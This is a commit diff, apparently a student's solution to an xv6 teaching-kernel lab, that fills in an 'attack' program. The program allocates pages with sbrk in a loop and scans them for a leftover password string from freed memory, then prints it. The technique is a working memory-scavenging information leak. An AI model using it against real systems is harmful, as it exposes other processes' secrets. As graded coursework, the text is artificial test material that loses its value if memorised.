496eab11fbc99b54b2e9aa25ae9950a0f06418cc
Liu Bingxu <qwe15889844242@163.com>
2026-04-23 17:32:40 +0800

    finish the attack test

--- user/attack.c
+++ user/attack.c
@@ -3,11 +3,14 @@
 #include "user/user.h"
 #include "kernel/riscv.h"
 
-int
-main(int argc, char *argv[])
-{
-  // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
-
-  exit(1);
+int main(int argc, char *argv[]){
+    char *end = 0;
+    while(1){
+        end = sbrk(PGSIZE);
+        if(memcmp(end + 8, "very very secret pw is: ", 24) == 0){
+            break;
+        }
+    }
+    write(2, end + 32, 64);
+    exit(0);
 }
